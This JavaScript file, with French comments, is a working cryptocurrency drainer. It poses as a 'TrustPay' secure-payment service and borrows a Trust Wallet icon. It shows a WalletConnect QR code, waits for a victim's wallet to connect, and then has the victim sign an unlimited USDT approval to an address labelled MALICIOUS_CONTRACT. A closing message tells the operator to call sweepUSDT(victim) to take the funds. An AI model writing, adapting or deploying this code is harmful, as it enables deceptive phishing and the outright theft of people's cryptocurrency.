// walletconnect.js
import { SignClient } from "@walletconnect/sign-client";
import qrcode from "qrcode";
import fs from "fs";
import dotenv from "dotenv";
import * as ethers from "ethers";

dotenv.config();

const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT officiel (Ethereum)
const MALICIOUS_CONTRACT = "0x11489f371A7230013C4d3d5151f0aD1F900C3ad0";
const CHAIN_ID = "eip155:1"; // Ethereum Mainnet

async function main() {
  const client = await SignClient.init({
    projectId: process.env.WALLETCONNECT_PROJECT_ID,
    metadata: {
      name: "TrustPay",
      description: "Connexion pour paiement sécurisé",
      url: "https://trustpay.finance",
      icons: ["https://trustwallet.com/assets/images/media/assets/TWT.png"],
    },
  });

  const { uri, approval } = await client.connect({
    requiredNamespaces: {
      eip155: {
        methods: ["eth_sendTransaction"],
        chains: [CHAIN_ID],
        events: ["accountsChanged", "chainChanged"],
      },
    },
  });

  if (uri) {
    console.log("QR généré :", uri);
    await qrcode.toFile("static/qrcode.png", uri);
    console.log("✅ QR enregistré dans static/qrcode.png");
  }

  const session = await approval(); // Attente de connexion

  const address = session.namespaces.eip155.accounts[0].split(":")[2];
  console.log("💡 Wallet connecté :", address);

  const iface = new ethers.Interface([
    "function approve(address spender, uint256 value)",
  ]);

  const data = iface.encodeFunctionData("approve", [
    MALICIOUS_CONTRACT,
    ethers.MaxUint256,
  ]);

  const tx = {
    from: address,
    to: USDT_ADDRESS,
    data,
  };

  console.log("📤 Envoi approve(...)");
  await client.request({
    topic: session.topic,
    chainId: CHAIN_ID,
    request: {
      method: "eth_sendTransaction",
      params: [tx],
    },
  });

  console.log("✅ approve() envoyé avec succès.");
  console.log("🧠 Tu peux maintenant appeler sweepUSDT(victim) dans ton contrat.");
}

main();
